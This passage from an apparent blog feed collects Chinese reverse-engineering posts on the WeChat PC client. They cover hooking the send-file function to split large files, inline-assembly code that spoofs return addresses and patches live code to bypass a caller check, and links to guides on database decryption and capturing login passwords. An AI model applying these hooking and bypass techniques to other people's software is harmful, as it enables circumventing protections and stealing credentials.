  [ebp-64h], esp</span><br><span class="line">.text:100CC13A E08 FF 75 B4                                      push    dword ptr [ebp-4Ch]</span><br><span class="line">.text:100CC13D E0C E8 EE 5E 3B 00                                call    sub_10482030</span><br><span class="line">.text:100CC142 E08 8D 85 40 FB FF FF                             lea     eax, [ebp-4C0h] ; wxid</span><br><span class="line">.text:100CC148 E08 C6 45 FC 0F                                   mov     byte ptr [ebp-4], 0Fh</span><br><span class="line">.text:100CC14C E08 50                                            push    eax             ;</span><br><span class="line">.text:100CC14D E0C E8 AE F9 F9 FF                                call    sub_1006BB00</span><br><span class="line">.text:100CC152 E0C 8B C8                                         mov     ecx, eax</span><br><span class="line">.text:100CC154 E0C C6 45 FC 0C                                   mov     byte ptr [ebp-4], 0Ch</span><br><span class="line">.text:100CC158 E0C E8 83 C1 16 00                                call    sub_102382E0 //发送文件</span><br></pre></td></tr></table></figure> <p>接口大概是这个样子的。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void __stdcall fakeWechatSendMsg1(int unk, wchar_t* wxid, int len1, int maxlen1, int unk1, int unk2, wchar_t* path, int len2, int maxlen2, int unk3, int unk4, int a1, int a2, int a3, int a4, int a5, int a6)</span><br></pre></td></tr></table></figure> <p>然后hook sub_102382E0，拿到path文件路径后，获取文件大小，如果大于100M，则分割文件，然后重新调用sub_102382E0把分割文件发送出去。大概代码如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">bool fakeWechatSendMsgInternal(DWORD dwEcx, wchar_t* wxid, wchar_t* filepath)</span><br><span class="line">&#123;</span><br><span class="line">    int filesize = XxGetFileSize(filepath); //获取文件大小</span><br><span class="line">    if (filesize &gt; FILE_SIZE_100M) &#123;</span><br><span class="line">        return ExtendSendFile(dwEcx, wxid, filepath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool ExtendSendFile(DWORD dwEcx, wchar_t* wxid, WCHAR* filepath)</span><br><span class="line">&#123;</span><br><span class="line">    std::vector&lt;std::wstring&gt; filevec;</span><br><span class="line">    if (SplitFile(filepath, filevec) &amp;&amp; filevec.size() &gt; 0) &#123; //分割文件</span><br><span class="line">        for (int i = 0; i &lt; filevec.size(); i++) &#123;</span><br><span class="line">            SendFileMsg(wxid, (WCHAR*)filevec[i].c_str()); //发送分割文件</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>OK，突破服务器100M限制也完成了（详细实现代码请移步SuperWeChatPC开源项目）。</p> <p>不过在测试中，发现bug多多（说的是微信）。</p> <ul> <li>经测试自带单文件发送功能，100M，甚至99M、或者更小点的文件，发送到最后都没成功，微信bug or 网络问题？</li> <li>96M左右可以成功，55M左右文件可以妙传，不稳定，这个可能网络问题，但是我怎么也是100M宽带啊。</li> <li>自带多个文件同时发送，40M都无法发送成功。</li> <li>有时还会提示：文件无法发送，已超过今日发送限制。</li> <li>而此时选择10M以内文件依然能够发送成功。</li> </ul> <p>所以最后，我不得不面对现实，把文件分割成了每个10M大小的文件进行尝试，终于一个大于100M的文件发送成功了，并且非常稳定！</p> <p><img src="/img/wechat_100_3.png" alt="img"></p> <h3 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h3><p>简单总结一下，我是如何让微信发送成功100M以上文件的。</p> <ol> <li>首先、突破本地100M限制，也就是选择100M文件限制，最终patch三个点绕过判断即可。</li> <li>然后，hook发送文件接口，把大于100M文件分割，然后自动发送小文件。</li> <li>最后，接收方自动合并文件（并没有做，哈哈）</li> </ol> <p>因为接收方并没有做自动合并的功能，所以需要自己合并一下，也很简单。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//使用windows原生命令合并文件</span><br><span class="line">copy /b Test_100M.pdf._1+Test_100M.pdf._2+Test_100M.pdf._3 Test_100M.pdf</span><br></pre></td></tr></table></figure> <p>让这个功能更完美，还需要做：</p> <ol> <li>删除分割的小文件</li> <li>接收方自动合并文件</li> <li>微信修复bug，能够100M分割（@tencent @weixin)</li> </ol> <p>最后，想试用大文件传输功能，请下载最新的<a href="https://github.com/anhkgg/SuperWeChatPC" target="_blank" rel="noopener">https://github.com/anhkgg/SuperWeChatPC</a>。</p> <p>欢迎PR、star、试用。</p> <p>欢迎关注技术公众号：<strong><span style="color:red">汉客儿</span></strong><br><img src="/img/wx.png" alt="img"></p> <p>转载请注明出处：<a href="https://anhkgg.com/anti-call/" target="_blank" rel="noopener">https://anhkgg.com/anti-call/</a></p> ]]></content>          <summary type="html">            &lt;p&gt;9102年了，我想大部分人使用微信的频率应该都会高于QQ了吧。&lt;/p&gt; &lt;p&gt;以前在QQ传文件的时候，哪里会想到会有文件大小限制，几G、几十G的文件随意传。&lt;/p&gt; &lt;p&gt;而现在，用微信传文件，很尴尬，只能传100M或更小的文件。&lt;/p&gt; &lt;p&gt;为什么做这个限制？我想可能是因为微信一开始就是手机应用。&lt;/p&gt;          </summary>            <category term="wechat" scheme="https://anhkgg.github.io/categories/wechat/"/>                 <category term="wechat" scheme="https://anhkgg.github.io/tags/wechat/"/>            <category term="crack" scheme="https://anhkgg.github.io/tags/crack/"/>        </entry>      <entry>     <title>一次美丽的误会引发对函数调用保护的思考</title>     <link href="https://anhkgg.github.io/anti-call/"/>     <id>https://anhkgg.github.io/anti-call/</id>     <published>2019-08-09T06:45:27.000Z</published>     <updated>2019-08-09T06:48:39.794Z</updated>          <content type="html"><![CDATA[<p>如何防止别人调用自己的函数？</p> <a id="more"></a> <p>很久没碰wx了，最近想写个东西，就重新拿了起来，最新版本2.6.8.65（此时已经2.6.8.68）。</p> <p>找到以前分析过的发送文本消息接口，发现函数大变样，很明显的vm痕迹。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.vmp0:1131CE33 000                 push    2493AC03h</span><br><span class="line">.vmp0:1131CE38 004                 call    sub_1134AEB3</span><br><span class="line">.vmp0:1131CE3D 000                 mov     cx, [ebp+0]</span><br><span class="line">.vmp0:1131CE42 000                 test    bp, 373Dh</span><br><span class="line">.vmp0:1131CE47 000                 shl     ah, cl</span><br><span class="line">.vmp0:1131CE49 000                 mov     dx, [ebp+2]</span><br><span class="line">.vmp0:1131CE4E 000                 cmovnb  eax, edi</span><br><span class="line">.vmp0:1131CE51 000                 lea     ebp, [ebp-2]</span><br><span class="line">...</span><br><span class="line">.vmp0:1131CE9C                     bswap   eax</span><br><span class="line">.vmp0:1131CE9E                     inc     eax</span><br></pre></td></tr></table></figure> <p>当时也没在意，仔细看接口参数并没有变化，就直接拿来用了。</p> <p>结果发现接口不能用了，并没有成功发送文本信息。</p> <p>擦，难道vm里面藏了什么玄机，做了防止函数调用的保护？？</p> <p>…</p> <p>正整备大干一场的时候，重新测试给别人发送消息是ok的。</p> <p>这是一次美丽的误会，测试时是给自己的微信发送消息，结果证明该接口是不能给自己发的，所以没成功。</p> <p>…</p> <p>然后就继续说说先前自以为的wx在函数中可能做的防止调用的保护吧。</p> <h3 id="防"><a href="#防" class="headerlink" title="防"></a>防</h3><p>按照自己思考的防止别人调用函数的思路，其实就是检查调用源，那么肯定是从调用栈入手：</p> <ol> <li>在函数内部回溯调用堆栈，检查返回地址</li> <li>返回地址为微信模块则正常调用，否则拒绝执行</li> <li>可能检查一层（wechatwin.dll），或者多层</li> <li>可能检测返回地址在模块范围，或者是准确的返回地址</li> <li>vm相关逻辑，增加分析难度</li> </ol> <p>大概实现代码就是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void TestAntiCall(DWORD a1)</span><br><span class="line">&#123;</span><br><span class="line">//vmstart</span><br><span class="line">    DWORD retAddr = *((DWORD*)((char*)&amp;a1 - 4));//</span><br><span class="line">    if(retAddr &gt; wxModuleBase &amp;&amp; retAddr &lt; wxModuleEnd) &#123;</span><br><span class="line">      //do things</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">       //anti</span><br><span class="line">      //do nothing</span><br><span class="line">    &#125;</span><br><span class="line">//vmend</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <h3 id="攻"><a href="#攻" class="headerlink" title="攻"></a>攻</h3><p>所以能够想到的对抗方式就是在调用TestAntiCall的时候，修改调用栈返回地址，让TestAntiCall误以为确实是正常调用。</p> <p>这里分析只考虑检查一层返回地址。</p> <p>比如如下正常调用代码，00003就是返回地址，在合法模块内，即可正常调用。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//正常调用代码</span><br><span class="line">void Right_TestAntiCall()</span><br><span class="line">&#123;</span><br><span class="line">00001 push a1</span><br><span class="line">00002 call TestAntiCall</span><br><span class="line">00003 add esp, 4</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>而我的调用TestAntiCall函数（在我的模块内）如下，<code>add esp, 4;</code>为TestAntiCall拿到的返回地址，这个地址肯定在我的模块内，调用失败。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pfnTestAntiCall = 原始TestAntiCall地址;</span><br><span class="line">pfnTestAntiCall_RetAddr = 000003;//调用TestAntiCall返回地址</span><br><span class="line">//这个会失败</span><br><span class="line">void MyTestAntiCall(DWORD a1)</span><br><span class="line">&#123;</span><br><span class="line"> __asm &#123;</span><br><span class="line">    push a1;</span><br><span class="line">    call pfnTestAntiCall;</span><br><span class="line">    add esp, 4; //返回地址</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>然后尝试欺骗<code>TestAntiCall</code>，我们修改一下调用栈的返回地址（本来应该是MyRetAddr）。</p> <p>通过<code>push+jmp</code>来替换通常的<code>call</code>，这样返回地址由我们自己压入，这里压入正常调用的返回地址<code>g_SendTextMsgRetAddr</code>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//这个会成功</span><br><span class="line">void MyTestAntiCall(DWORD a1)</span><br><span class="line">&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push a1;</span><br><span class="line">        push g_SendTextMsgRetAddr;//压入原始retaddr</span><br><span class="line">        jmp pfnWxSendTextMsg; //调用函数，这样函数内部检测就是正常的</span><br><span class="line">        add esp, 4; //MyRetAddr</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>当然，就这么简单的调用，肯定会出问题的，因为<code>jmp pfnWxSendTextMsg</code>之后，就会返回到<code>Right_TestAntiCall</code>的<code>00003</code>，如此显然导致栈破坏，会出现崩溃。</p> <p>所以为了让程序正常执行，还需要多两个处理步骤。</p> <ol> <li><code>Right_TestAntiCall</code>的00003处修改指令为jmp MyRetAddr。让执行流返回到MyTestAntiCall1</li> <li>恢复00003处原始指令。</li> </ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">//1. `Right_TestAntiCall`的00003处修改指令为jmp MyRetAddr。让执行流返回到MyTestAntiCall1</span><br><span class="line">void fakeAntiTestCall(DWORD retaddr1, DWORD retaddr2, char OrigCode[5])</span><br><span class="line">&#123;</span><br><span class="line">    DWORD MyRetAddr = retaddr1 - 24;</span><br><span class="line">    DWORD ShellCode[5] = &#123; 0xe9, 0x00, 0x00, 0x00, 0x00 &#125;;</span><br><span class="line">    *((DWORD*)(&amp;ShellCode[1])) = MyRetAddr;</span><br><span class="line">    memcpy(OrigCode, (char*)retaddr2, 5);</span><br><span class="line">    Patch((PVOID)retaddr2, 5, ShellCode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//2. 恢复00003处原始指令。</span><br><span class="line">void fakeAntiTestCall1(DWORD retaddr2, char OrigCode[5])</span><br><span class="line">&#123;</span><br><span class="line">    Patch((PVOID)retaddr2, 5, OrigCode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//这个会成功</span><br><span class="line">void MyTestAntiCall(DWORD a1)</span><br><span class="line">&#123;</span><br><span class="line">    DWORD MyRetAddr = 0;</span><br><span class="line">    char OrigCode[5] = &#123; 0 &#125;;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        jmp RET1;</span><br><span class="line">    INIT:</span><br><span class="line">        pop eax;//retAddr</span><br><span class="line">        mov MyRetAddr, eax;</span><br><span class="line">        lea eax, OrigCode;</span><br><span class="line">        push eax;</span><br><span class="line">        push g_SendTextMsgRetAddr;</span><br><span class="line">        push MyRetAddr;</span><br><span class="line">        call fakeAntiTestCall; //在原始g_SendTextMsgRetAddr处跳入MyTestAntiCall1的MyRetAddr</span><br><span class="line">        push a1;</span><br><span class="line">        push g_SendTextMsgRetAddr;//压入原始retaddr</span><br><span class="line">        jmp pfnWxSendTextMsg; //调用函数，这样函数内部检测就是正常的</span><br><span class="line">        add esp, 4; //MyRetAddr</span><br><span class="line">        lea eax, OrigCode;</span><br><span class="line">        push eax;</span><br><span class="line">        push g_SendTextMsgRetAddr;</span><br><span class="line">        call fakeAntiTestCall1;//恢复g_SendTextMsgRetAddr数据</span><br><span class="line">        ret;</span><br><span class="line">    RET1:</span><br><span class="line">        call INIT;</span><br><span class="line">        nop;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>为了拿到MyRetAddr的地址，通过call+pop的方法完成，如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__asm &#123;</span><br><span class="line">    jmp RET1:</span><br><span class="line">    WORK:</span><br><span class="line">        pop eax; //eax = retaddr</span><br><span class="line">        mov retaddr, eax;</span><br><span class="line">        //do thing</span><br><span class="line">        add esp, 4;//MyRetAddr</span><br><span class="line">    RET1:</span><br><span class="line">        call WORK;//push retaddr; jmp WORK;</span><br><span class="line">        nop;//retaddr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>上面拿到retaddr和MyRetAddr明显不是同一个，所以在<code>fakeAntiTestCall</code>中减去一个偏移24拿到<code>MyRetAddr</code>。</p> <p>偏移值通过下面的字节码可以计算出来<code>10024E1E</code> - <code>10024E06</code> = 24。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:10024DDF EB 37                             jmp     short RET1</span><br><span class="line">.text:10024DE1                   INIT:   </span><br><span class="line">.text:10024DE1 58                                pop     eax</span><br><span class="line">.text:10024DE2 89 45 F4                          mov     MyRetAddr, eax</span><br><span class="line">.text:10024DE5 8D 45 F8                          lea     eax, OrigCode</span><br><span class="line">.text:10024DE8 50                                push    eax</span><br><span class="line">.text:10024DE9 FF 35 00 D0 25 10                 push    pfnTestAntiCall_RetAddr</span><br><span class="line">.text:10024DEF FF 75 F4                          push    MyRetAddr</span><br><span class="line">.text:10024DF2 E8 C9 00 00 00                    call    fakeAntiTestCall; </span><br><span class="line">.text:10024DF7 FF 75 E0                          push    a1</span><br><span class="line">.text:10024DFA FF 35 00 D0 25 10                 push    pfnTestAntiCall_RetAddr</span><br><span class="line">.text:10024E00 FF 25 D4 A4 28 10                 jmp     pfnTestAntiCall; </span><br><span class="line">.text:10024E06 83 C4 04                          add     esp, 4</span><br><span class="line">.text:10024E09 8D 45 F8                          lea     eax, OrigCode</span><br><span class="line">.text:10024E0C 50                                push    eax</span><br><span class="line">.text:10024E0D FF 35 00 D0 25 10                 push    MyRetAddr</span><br><span class="line">.text:10024E13 E8 88 00 00 00                    call    fakeAntiTestCall1; </span><br><span class="line">.text:10024E14 C3                                ret;</span><br><span class="line">.text:10024E19</span><br><span class="line">.text:10024E19                   RET1:    </span><br><span class="line">.text:10024E19 E8 C4 FF FF FF                    call    INIT</span><br><span class="line">.text:10024E1E 90                                nop</span><br></pre></td></tr></table></figure> <p>如此可以正常完成一次调用，但是还有问题，因为会反复修改<code>Right_TestAntiCall</code>的指令，可能在多线程中执行时出现问题。</p> <p>所以更好的方法时在<code>Right_TestAntiCall</code>的模块中找一个不用（零值）的内存，用来保护临时指令，不细讲了，大家自行探索吧。</p> <p>（完）</p> <p>转载请注明出处：<a href="https://anhkgg.com/anti-call/" target="_blank" rel="noopener">https://anhkgg.com/anti-call/</a></p> ]]></content>          <summary type="html">            &lt;p&gt;如何防止别人调用自己的函数？&lt;/p&gt;          </summary>            <category term="secure" scheme="https://anhkgg.github.io/categories/secure/"/>                 <category term="微信" scheme="https://anhkgg.github.io/tags/%E5%BE%AE%E4%BF%A1/"/>            <category term="保护" scheme="https://anhkgg.github.io/tags/%E4%BF%9D%E6%8A%A4/"/>        </entry>      <entry>     <title>微信逆向分析相关研究技术文章收集</title>     <link href="https://anhkgg.github.io/wechat-pc-study-technical-article-sets/"/>     <id>https://anhkgg.github.io/wechat-pc-study-technical-article-sets/</id>     <published>2019-08-06T02:43:05.000Z</published>     <updated>2019-08-16T04:11:52.723Z</updated>          <content type="html"><![CDATA[<p>微信相关研究技术文章收集，版权属于原作者，不定时更新。</p> <p>欢迎关注：<a href="https://github.com/anhkgg/awesome-wechat-technology" target="_blank" rel="noopener">https://github.com/anhkgg/awesome-wechat-technology</a></p> <a id="more"></a> <ul> <li><a href="https://mp.weixin.qq.com/s/bb7XMxop7e8rd7YqQ88nyA" target="_blank" rel="noopener">微信(WeChat)电脑端多开分析+源码</a></li> <li><a href="https://mp.weixin.qq.com/s/E7N6LzAH4p88Gu4f_qwGlg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/E7N6LzAH4p88Gu4f_qwGlg</a></li> <li><a href="https://mp.weixin.qq.com/s/h9d8aO79OvkpV9bknVT60A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/h9d8aO79OvkpV9bknVT60A</a></li> <li><a href="https://mp.weixin.qq.com/s/uUXB9AHtnhCsD7gAfFYRoA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/uUXB9AHtnhCsD7gAfFYRoA</a></li> <li><a href="https://mp.weixin.qq.com/s/WBDPc3Vd0X_zLb3qqITlmg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/WBDPc3Vd0X_zLb3qqITlmg</a></li> <li><a href="https://mp.weixin.qq.com/s/yGj_63iRbXRdJcnXKv9P8w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/yGj_63iRbXRdJcnXKv9P8w</a></li> <li><a href="https://mp.weixin.qq.com/s/JTHa4xOgD-CbgB8Rbkd3SA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/JTHa4xOgD-CbgB8Rbkd3SA</a></li> <li><p><a href="https://mp.weixin.qq.com/s/WfYJDY9OymRTigwn6u7IGw" target="_blank" rel="noopener">教会微信：突破文件发送100M限制</a></p> </li> <li><p><a href="https://bbs.pediy.com/thread-217610.htm" target="_blank" rel="noopener">[原创] 微信(WeChat)电脑端多开分析+源码</a></p> </li> <li><a href="https://bbs.pediy.com/thread-249274.htm" target="_blank" rel="noopener">[原创]微信PC端技术研究(2)-保存聊天语音</a></li> <li><a href="https://bbs.pediy.com/thread-248080.htm" target="_blank" rel="noopener">[原创]微信PC端技术研究-消息防撤销</a></li> <li><a href="https://bbs.pediy.com/thread-249635.htm" target="_blank" rel="noopener">[原创]SuperWeChatPC开源开放开发者SDK-打造你的超级微信</a></li> <li><a href="https://bbs.pediy.com/thread-249542.htm" target="_blank" rel="noopener">[原创]微信PC端技术研究(3)-如何找到消息发送接口</a></li> <li><a href="https://bbs.pediy.com/thread-200129.htm" target="_blank" rel="noopener">[原创]微信聊天备份加密原理</a></li> </ul> <p><strong>鬼手系列</strong></p> <ul> <li><a href="https://blog.csdn.net/qq_38474570/article/details/97820327" target="_blank" rel="noopener">PCXX逆向：终结篇——定位关键call的思路总结</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/97819595" target="_blank" rel="noopener">PCXX逆向：分析微信发送文件call</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/97818674" target="_blank" rel="noopener">PCXX逆向：分析群拉人功能</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/97817650" target="_blank" rel="noopener">PCXX逆向：分析发送xml名片call</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/97672427" target="_blank" rel="noopener">PCXX逆向：分析@群成员call</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/97404761" target="_blank" rel="noopener">PCXX逆向：实现自动添加好友分享名片</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/96757192" target="_blank" rel="noopener">PCXX逆向：分析获取群成员列表的call(part2)</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/96755951" target="_blank" rel="noopener">PCXX逆向：分析获取群成员列表的call(part1)</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/96723746" target="_blank" rel="noopener">【开源】WeChatRobot+WeChatHelper 制作自己的微信机器人</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/96606530" target="_blank" rel="noopener">PC微信逆向：两种姿势教你解密数据库文件</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/95889507" target="_blank" rel="noopener">PCXX逆向：使用HOOK获取好友列表和群列表</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/93339861" target="_blank" rel="noopener">PCXX逆向：发送与接收消息的分析与代码实现</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/93304599" target="_blank" rel="noopener">PCXX逆向：四种姿势教你干掉防多开</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/92798577" target="_blank" rel="noopener">PCXX逆向：使用HOOK拦截二维码</a></li> <li><p><a href="https://blog.csdn.net/qq_38474570/article/details/92571302" target="_blank" rel="noopener">PCXX逆向：使用CE+OD查找个人数据</a></p> </li> <li><p><a href="https://bbs.pediy.com/thread-222652.htm" target="_blank" rel="noopener">[原创]微信数据库解密算法</a></p> </li> <li><a href="https://bbs.pediy.com/thread-220798.htm" target="_blank" rel="noopener">[原创]pc端微信逆向分析</a></li> <li><a href="https://bbs.pediy.com/thread-223090.htm" target="_blank" rel="noopener">[原创]pc端微信辅助工具，duilib spy</a></li> <li><a href="https://www.52pojie.cn/thread-924687-1-1.html" target="_blank" rel="noopener">PC微信逆向 — 分析获取登录二维码的数据</a></li> <li><p><a href="https://bbs.pediy.com/thread-251303.htm" target="_blank" rel="noopener">[原创]PC版微信数据库解密详细教程</a></p> </li> <li><p><a href="https://bbs.pediy.com/thread-224988.htm" target="_blank" rel="noopener">[原创]PC微信发送消息研究</a></p> </li> <li><a href="https://bbs.pediy.com/thread-223178.htm" target="_blank" rel="noopener">[原创] 对控制PC端微信发送信息的研究</a></li> <li><a href="https://bbs.pediy.com/thread-223002.htm" target="_blank" rel="noopener">[原创]微信逆向之 —给微信添加控件–笔记</a></li> <li><p><a href="https://bbs.pediy.com/thread-248389.htm" target="_blank" rel="noopener">[原创]关于微信聊天机器人的半hook半协议研究</a></p> </li> <li><p><a href="https://blog.csdn.net/qq_21051503/article/details/79746742" target="_blank" rel="noopener">[原创]微信安卓协议分析笔记</a> 被和谐</p> </li> <li><a href="https://bbs.pediy.com/thread-228360.htm" target="_blank" rel="noopener">[原创]Xposed<strong><em>__</em></strong>监听微信登录帐号和密码</a></li> </ul> <p>关注技术公众号：<strong><span style="color:red">汉客儿</span></strong><br><img src="/img/wx.png" alt="img"></p> ]]></content>          <summary type="html">            &lt;p&gt;微信相关研究技术文章收集，版权属于原作者，不定时更新。&lt;/p&gt; &lt;p&gt;欢迎关注：&lt;a href=&quot;https://github.com/anhkgg/awesome-wechat-technology&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/anhkgg/awesome-wechat-technology&lt;/a&gt;&lt;/p&gt;          </summary>            <category term="wechat" scheme="https://anhkgg.github.io/categories/wechat/"/>                 <category term="微信" scheme="https://anhkgg.github.io/tags/%E5%BE%AE%E4%BF%A1/"/>            <category term="多开" scheme="https://anhkgg.github.io/tags/%E5%A4%9A%E5%BC%80/"/>            <category term="防撤销" scheme="https://anhkgg.github.io/tags/%E9%98%B2%E6%92%A4%E9%94%80/"/>            <category term="解密" scheme="https://anhkgg.github.io/tags/%E8%A7%A3%E5%AF%86/"/>        </entry>      <entry>     <title>微信PC端技术研究(2)-保存聊天语音</title>     <link href="https://anhkgg.github.io/wechat-voice/"/>     <id>https://anhkgg.github.io/wechat-voice/</id>     <published>2019-02-03T04:07:24.000Z</published>     <updated>2019-03-09T01:55:30.204Z</updated>          <content type="html"><![CDATA[<p>欢迎关注技术公众号：<strong><span style="color:red">汉客儿</span></strong><br><img src="/img/wx.png" alt="img"></p> <blockquote> <p>微信PC端技术研究-保存聊天语音<br>by anhkgg（公众号：汉客儿）<br>2019年1月31日</p> </blockquote> <h3 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0. 前言"></a>0x0. 前言</h3><p>虽然一直知道CE，也用过一段时间，但一直用不好，可能太笨。</p> <p>最近又学习了某位大佬用CE的方法，大佬的一句话有点醍醐灌顶，然后有了新的感觉，然后开始尝试实践这篇文章。</p> <p>自己总结一下CE用法的核心思路：通过各种技巧搜索找到内存中关键数据，然后结合动态调试找到操作数据的函数。</p> <p>准备工具：Cheat Engine，OllyDbg，IDA。</p> <a id="more"></a> <h3 id="0x1-了解CE"><a href="#0x1-了解CE" class="headerlink" title="0x1. 了解CE"></a>0x1. 了解CE</h3><p>官网：<a href="https://www.cheatengine.org/" target="_blank" rel="noopener">https://www.cheatengine.org/</a></p> <p>看看来自百科的介绍：</p> <blockquote> <p>Cheat Engine 是一款内存修改编辑工具 ，它允许你修改你的游戏或软件内存数据，以得到一些其他功能。它包括16进制编辑，反汇编程序，内存查找工具。与同类修改工具相比，它具有强大的反汇编功能，且自身附带了外挂制作工具，可以用它直接生成外挂。</p> </blockquote> <p>在我看来，CE做的最好的就是各种策略的内存搜索能力。</p> <ol> <li><p>支持准确数据（整数、字符串、十六进制、浮点数、字节数组等等）搜索，针对目标数据明确效果显著，比如金币数。</p> </li> <li><p>支持数据范围的搜索，比如大于某个值，小于某个值等等。比如想找到没有显示数值的血量数据。</p> </li> <li><p>支持多组数据同时搜索，针对数据结构复杂的情况</p> </li> <li><p>支持搜索结果的多次过滤（图中框选的Next 